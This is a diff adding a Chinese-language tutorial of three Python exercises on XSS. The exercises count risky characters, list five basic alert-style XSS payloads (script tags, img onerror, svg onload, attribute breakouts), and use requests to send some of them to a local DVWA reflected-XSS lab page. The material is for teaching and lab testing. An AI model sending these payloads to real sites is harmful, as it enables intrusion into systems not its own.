@@ -1,0 +1,70 @@
+## 一、核心目标
+1.  实现XSS高危特殊字符统计，理解输入层防护的基础逻辑
+2.  编写批量XSS Payload遍历脚本，掌握自动化测试思路
+3.  使用requests库批量发送XSS载荷，模拟反射型XSS的批量探测流程
+
+---
+
+## 二、代码实现与逐行解析
+
+### 第1题：统计XSS高危特殊字符
+```python
+# 定义包含XSS特征的测试字符串
+test_str = '<script>alert("xss");document.cookie</script>'
+# 定义XSS高危特殊字符集合
+special_chars = {'<', '>', '"', "'", '(', ')', ';', '&'}
+# 初始化计数器
+count = 0
+# 遍历字符串中每一个字符
+for char in test_str:
+    # 判断是否为高危特殊字符
+    if char in special_chars:
+        count += 1
+        print("检测到高危字符：", char)
+# 输出统计总数
+print("XSS高危特殊字符总个数：", count)
+
+### 第2题：遍历批量XSS Payload
+# 定义常用XSS测试载荷列表
+xss_payload_list = [
+    "<script>alert(1)</script>",
+    "< img src=x onerror=alert(2)>",
+    "<svg onload=alert(3)>",
+    "' onclick=alert(4) //",
+    "\" onmouseover=alert(5) "
+]
+# 带序号遍历所有Payload
+for index, payload in enumerate(xss_payload_list):
+    print(f"第{index+1}条XSS Payload：{payload}")
+
+### 第3题：requests联动当日XSS漏洞
+# 导入网络请求库，用于模拟浏览器发送HTTP请求
+import requests
+# 靶场反射型XSS目标地址，自行替换为本机IP
+target_url = "http://localhost/dvwa/vulnerabilities/xss_r/"
+# 构造多条测试Payload，含攻击载荷与正常文本做对比
+payloads = [
+    "<script>alert(1)</script>",
+    "< img src=x onerror=alert(2)>",
+    "test_normal_input"
+]
+# 模拟浏览器请求头
+headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+}
+# 循环逐个测试Payload
+for pay in payloads:
+    # 拼接GET请求参数
+    params = {"name": pay}
+    # 发送GET请求，设置超时防止卡死
+    res = requests.get(url=target_url, headers=headers, params=params, timeout=10)
+    # 打印分隔线便于查看
+    print("-" * 60)
+    # 输出当前测试载荷
+    print("当前测试Payload：", pay)
+    # 输出HTTP状态码
+    print("响应状态码：", res.status_code)
+    # 输出页面响应长度，用于对比是否原样回显
+    print("响应页面长度：", len(res.text))
+print("-" * 60)
+print("XSS批量请求测试全部完成")
